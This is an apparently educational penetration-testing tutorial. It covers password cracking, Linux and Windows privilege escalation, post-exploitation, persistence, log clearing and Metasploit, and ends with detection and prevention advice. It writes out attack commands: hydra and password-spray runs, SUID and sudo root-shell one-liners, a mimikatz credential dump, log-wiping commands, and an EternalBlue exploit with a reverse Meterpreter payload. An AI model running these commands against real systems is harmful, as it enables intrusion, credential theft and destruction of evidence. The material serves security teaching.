Exploitation Overview

Exploitation is the process of taking advantage of a vulnerability to gain unauthorized access, escalate privileges, or achieve other security objectives.

Types of Exploitation

  • Remote Exploitation - Attack over network without physical access
  • Local Exploitation - Requires some level of access already (privilege escalation)
  • Client-Side Exploitation - Target user's browser, email client, etc.
  • Web Application Exploitation - SQLi, XSS, RCE through web apps
  • Password Attacks - Credential-based access (most common)
  • Social Engineering - Exploiting human vulnerabilities

Exploitation Goals

  • Initial Access - Get a foothold in the target environment
  • Code Execution - Run arbitrary commands on target system
  • Data Exfiltration - Steal sensitive information
  • Persistence - Maintain access for future use
  • Lateral Movement - Spread to other systems
  • Privilege Escalation - Gain higher-level access (root/SYSTEM)

Exploitation vs Proof of Concept

In ethical hacking, you often stop at proving a vulnerability exists rather than fully exploiting it. Demonstrating access is usually sufficient without causing damage.

Password Attacks

The most common exploitation vector. Compromising credentials provides legitimate access without exploiting technical vulnerabilities.

Attack Types

Dictionary Attack

Try common passwords from a wordlist. Fast but limited by wordlist quality. Success depends on users choosing weak passwords.

# Hydra dictionary attack against SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

Brute Force Attack

Try every possible password combination. Guaranteed to work eventually but extremely slow. Practical only for short passwords.

# Brute force 4-character numeric PIN
crunch 4 4 0123456789 | hydra -l admin -P - ssh://target.com

Rainbow Table Attack

Pre-computed hash tables for instant password cracking. Trade storage for speed. Defeated by salted hashes.

Credential Stuffing

Use leaked credentials from breaches. Many users reuse passwords across sites. Check haveibeenpwned.com for leaked databases.

Password Spraying

Try a few common passwords against many accounts. Avoids account lockouts. "Password123" against all users instead of many passwords against one user.

# Password spray against list of usernames
crackmapexec smb target.com -u users.txt -p 'Password123'

Password Cracking Tools

When you have password hashes, cracking tools attempt to recover plaintext passwords. This is educational - understanding defense requires understanding attack.

Hashcat

GPU-accelerated password cracker. Fastest tool available. Supports hundreds of hash types.

# Identify hash type
hashcat --example-hashes | grep -i "ntlm"

# Dictionary attack
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Brute force (8 chars, lowercase + digits)
hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?d?d?d?d

# Rule-based attack (dictionary + rules)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule

John the Ripper

CPU-based cracker. Excellent automatic mode and rule generation. Good for variety of formats.

# Automatic mode (tries common passwords)
john hashes.txt

# Dictionary attack
john --wordlist=rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

Common Hash Types

  • MD5 - 32 hex characters (fast to crack, insecure)
  • SHA-1 - 40 hex characters (deprecated)
  • NTLM - Windows password hashes
  • bcrypt - Secure hash with work factor (slow to crack)
  • SHA-256/512 - Modern, stronger hashes

Privilege Escalation Overview

Getting initial access is often just the beginning. Privilege escalation is moving from low-privilege access to administrative control.

Types of Privilege Escalation

Vertical Escalation

Moving from low-privilege user to high-privilege user (admin/root).

Examples:

  • Standard user → Administrator
  • Web user → Root
  • Guest → SYSTEM

Horizontal Escalation

Moving from one user to another user with same privilege level.

Examples:

  • User A → User B
  • Access another user's data
  • Impersonate different account

Why Privilege Escalation Matters

  • Initial access is often limited (web shell, low-privilege account)
  • Administrative access allows:
    • Install persistence mechanisms
    • Disable security controls
    • Access all data on system
    • Pivot to other systems
    • Clear logs and cover tracks
  • Demonstrates true impact of compromise

Linux Privilege Escalation

Linux systems have numerous privilege escalation vectors. Enumeration is key to finding them.

Common Vectors

SUID/SGID Binaries

Files that run with owner's privileges. If misconfigured, can lead to root access.

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Common exploitable SUID binaries:
# /usr/bin/find, /usr/bin/vim, /usr/bin/nano, etc.

# Example exploit (if /usr/bin/find is SUID root):
find . -exec /bin/sh -p \; -quit

Sudo Misconfigurations

User allowed to run certain commands as root. Check GTFOBins for exploitation techniques.

# Check sudo permissions
sudo -l

# Example: If allowed to run vim
sudo vim -c ':!/bin/sh'

# Example: If allowed to run find
sudo find . -exec /bin/sh \; -quit

Cron Jobs

Scheduled tasks running as root with writable scripts.

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# If script is writable, replace with reverse shell

Kernel Exploits

Exploit kernel vulnerabilities for root. Nuclear option - can crash system.

# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 4.4

Windows Privilege Escalation

Windows privilege escalation exploits misconfigurations in services, paths, and permissions.

Common Vectors

Unquoted Service Paths

Service path contains spaces without quotes. Windows searches for executables in unexpected locations.

# Vulnerable: C:\Program Files\My App\service.exe
# Windows will try:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe

# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Place malicious executable in earlier path

Weak Service Permissions

Service can be modified by low-privilege user. Replace service binary with malicious one.

# Check service permissions with accesschk.exe
accesschk.exe -uwcqv "Authenticated Users" *

# If service is writable, replace binary
sc config vulnerable binPath= "C:\path\to\malicious.exe"
sc stop vulnerable
sc start vulnerable

DLL Hijacking

Application loads DLL from writable location. Place malicious DLL there.

Token Impersonation

Steal authentication tokens from privileged processes. Requires SeImpersonatePrivilege.

# Check privileges
whoami /priv

# If SeImpersonatePrivilege enabled, use tools like:
# - JuicyPotato
# - PrintSpoofer
# - RoguePotato

Post-Exploitation

Once you have high-level access, post-exploitation activities determine the full impact of compromise.

Key Post-Exploitation Activities

  • Situational Awareness - Understand what you've compromised
  • Credential Harvesting - Extract stored passwords, tokens, keys
  • Lateral Movement - Spread to other systems on the network
  • Data Exfiltration - Identify and extract valuable data
  • Persistence - Maintain access for future use
  • Covering Tracks - Remove evidence (educational understanding only)

Situational Awareness Commands

# Linux
whoami && id
hostname
ip a
ps aux
netstat -tulpn
cat /etc/passwd

# Windows
whoami /all
hostname
ipconfig /all
tasklist
netstat -ano
net user
net localgroup administrators

Credential Harvesting

# Linux - Search for credentials
grep -r "password" /home
find / -name "*.conf" -type f 2>/dev/null | xargs grep "pass"
cat ~/.bash_history

# Windows - Dump credentials
# Using Mimikatz (if in memory):
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

Maintaining Access

Persistence mechanisms ensure continued access even after reboots or detection of initial compromise. Understanding these helps defenders detect and remove them.

Linux Persistence Techniques

  • SSH Keys - Add attacker's public key to ~/.ssh/authorized_keys
  • Cron Jobs - Schedule reverse shell to connect periodically
  • Systemd Services - Create service that runs on boot
  • .bashrc / .profile - Execute code when user logs in
  • Backdoor Accounts - Create hidden administrative user

Windows Persistence Techniques

  • Registry Run Keys - Execute on user login (HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run)
  • Scheduled Tasks - Run payload at specific times or events
  • Services - Create Windows service for persistence
  • Startup Folder - Place executable in startup folder
  • WMI Event Subscriptions - Advanced persistence using WMI
  • DLL Hijacking - Replace legitimate DLL with malicious one

Advanced Persistence: Rootkits

Rootkits hide their presence by modifying the operating system. Types:

  • User-mode Rootkits - Modify system binaries and libraries
  • Kernel-mode Rootkits - Operate at kernel level, very difficult to detect
  • Bootkit - Infect boot process, load before OS
  • Firmware Rootkit - Persist in device firmware, survive OS reinstall

Ethical Boundaries

In authorized penetration testing, you typically demonstrate persistence capability without implementing it fully. Always coordinate with client before installing persistence mechanisms.

Covering Tracks

Understanding how attackers cover their tracks helps defenders implement proper logging and detection. This is educational context - ethical hackers document everything.

Log Manipulation Techniques

  • Log Deletion - Remove entire log files (obvious to defenders)
  • Log Clearing - Clear specific log entries
  • Log Tampering - Modify timestamps or content
  • Log Disabling - Stop logging services temporarily

Linux Log Locations

/var/log/auth.log # Authentication attempts
/var/log/syslog # System logs
/var/log/apache2/ # Web server logs
/var/log/secure # Security logs (RHEL/CentOS)
~/.bash_history # Command history

# Attackers might:
> /var/log/auth.log # Truncate log
history -c # Clear command history
unset HISTFILE # Disable history logging

Windows Log Locations

# Event Viewer logs:
- Security
- System
- Application

# Clear Windows Event Logs (requires admin):
wevtutil cl Security
wevtutil cl System

# PowerShell history:
del (Get-PSReadlineOption).HistorySavePath

Timestomping

Modifying file timestamps to hide evidence of modification.

Defensive Perspective

  • Centralized Logging - Forward logs to SIEM in real-time
  • Immutable Logs - Write-once storage prevents tampering
  • Log Integrity Monitoring - Detect log modifications
  • Backup Logs - Maintain copies attacker can't access

Metasploit Framework

The world's most popular penetration testing framework. Modular, extensible, with thousands of exploits and payloads.

Framework Structure

  • Exploits - Code that triggers vulnerabilities
  • Payloads - Code that runs after successful exploitation
  • Auxiliary - Supporting modules (scanners, fuzzers, etc.)
  • Encoders - Obfuscate payloads to evade detection
  • Post - Post-exploitation modules
  • Nops - No-operation instructions for buffer alignment

Basic Workflow

# Launch Metasploit
msfconsole

# Search for exploit
search eternalblue

# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# View options
show options

# Set required options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5

# Select payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check if target is vulnerable
check

# Launch exploit
exploit

# If successful, you get a Meterpreter shell

Meterpreter

Advanced payload providing interactive shell with many features:

  • File upload/download
  • Screenshot capture
  • Keylogging
  • Privilege escalation
  • Credential dumping
  • Network pivoting

Defense Perspective

Understanding exploitation helps you defend against it. Every attack technique has corresponding detection and prevention strategies.

Detecting Password Attacks

  • Failed Login Monitoring - Alert on multiple failures
  • Account Lockout Policies - Lock accounts after X failed attempts
  • Geolocation Analysis - Detect impossible travel
  • Baseline Behavior - Alert on unusual login times/locations
  • Honeypot Accounts - Fake accounts that trigger alerts when accessed

Detecting Privilege Escalation

  • File Integrity Monitoring - Detect modifications to SUID binaries, sudoers
  • Audit Logging - Log all sudo usage, privilege changes
  • Behavioral Analysis - Alert on unusual process trees
  • Kernel Module Monitoring - Detect unauthorized kernel modules

Detecting Post-Exploitation

  • Network Traffic Analysis - Detect beaconing, data exfiltration
  • Process Monitoring - Alert on suspicious processes (mimikatz, psexec)
  • Credential Monitoring - Detect credential dumping attempts
  • Lateral Movement Detection - Monitor for pass-the-hash, RDP brute force

Prevention Best Practices

  • Patch management - Apply security updates promptly
  • Least privilege principle - Users only get necessary permissions
  • Strong password policies - Length, complexity, no reuse
  • Multi-factor authentication - Second factor defeats password compromise
  • Network segmentation - Limit lateral movement
  • Application whitelisting - Only allow approved software
  • EDR/XDR solutions - Advanced endpoint detection and response
